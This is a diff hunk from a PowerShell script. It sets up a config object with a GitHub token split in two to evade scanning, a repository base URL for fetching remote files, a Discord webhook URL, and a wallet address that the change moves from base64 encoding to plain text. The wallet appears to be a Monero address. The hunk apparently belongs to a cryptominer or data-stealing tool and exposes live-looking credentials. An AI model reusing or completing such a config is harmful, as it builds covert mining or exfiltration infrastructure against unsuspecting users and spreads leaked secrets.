@@ -43,7 +43,7 @@ $c = @{}
 $c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
 $p1 = 'ghp_x0tf1YFQcn'; $p2 = 'AYM79aWZpnZKahM8QkHV2lHFLw'
 $c.pat = $p1 + $p2
-$c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ4M0cxQWdTMXBkc0xxenQzbkZRbUw4SFBGM0MyV1ZyTE1SQWRBVkdxeHo2aXBWM2FGOG5vN2NtRGtINHdNWno5WUQ1cU5VWjk2bkdMTUtwZHQ1clhacU13R2ZMYzM='))
+$c.addr = '4483G1AgS1pdsLqzt3nFQmL8HPF3C2WVrLMRAdAVGqxz6ipV3aF8no7cmDkH4wMZz9YD5qNUZ96nGLMKpdt5rXZqMwGfLc3'
 $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
 $c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"
 
